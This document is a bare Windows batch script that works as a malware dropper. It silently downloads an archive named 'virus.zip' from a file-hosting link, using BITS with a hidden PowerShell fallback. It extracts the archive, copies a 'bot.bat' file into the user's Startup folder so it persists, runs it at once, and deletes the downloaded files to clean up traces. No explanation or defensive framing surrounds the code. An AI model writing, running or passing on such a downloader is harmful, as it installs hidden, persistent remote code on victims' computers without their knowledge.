@echo off
setlocal enabledelayedexpansion

:: Download the zip using BITS (works silently, no progress bar)
set "url=https://download1348.mediafire.com/36dblf0tt5igsUNOtr4I4ZSsmkanDpC9HDYhIBwyI8rsFQz6puSHc90lVDKIoBSo5zkoU_bkHC57zIAUHmlz_pukDjxvs8c3w_lQvMyf5Tncpe4sahRaNYJwyxLRtWdSBtbMHBpIgfYYPdy9Pxr5dp2qkKlt02aEWl82fcr4k2cu/cefa3ljyy89sue9/virus.zip"
set "zipfile=%TEMP%\payload.zip"
set "extractdir=%TEMP%\payload_extracted"

bitsadmin /transfer "MyDownload" /priority FOREGROUND %url% "%zipfile%" >nul 2>&1
if not exist "%zipfile%" (
    powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%zipfile%'" -WindowStyle Hidden
)

:: Extract using PowerShell
powershell -Command "Expand-Archive -Path '%zipfile%' -DestinationPath '%extractdir%' -Force" -WindowStyle Hidden

:: Find bot.bat recursively
set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "botpath="
for /r "%extractdir%" %%f in (bot.bat) do (
    set "botpath=%%f"
    goto :copyfile
)

:copyfile
if not defined botpath (
    :: If not found, just launch whatever exists
    dir /s /b "%extractdir%\*.bat" >nul 2>&1
    for /f "delims=" %%g in ('dir /s /b "%extractdir%\*.bat" 2^>nul') do (
        set "botpath=%%g"
        goto :copyfile
    )
)

if defined botpath (
    copy /y "!botpath!" "%startup%\bot.bat" >nul 2>&1
    :: Run the script now
    start "" "%startup%\bot.bat"
)

:: Clean up traces (optional)
timeout /t 2 /nobreak >nul
del /f /q "%zipfile%" >nul 2>&1
rmdir /s /q "%extractdir%" >nul 2>&1

endlocal
exit
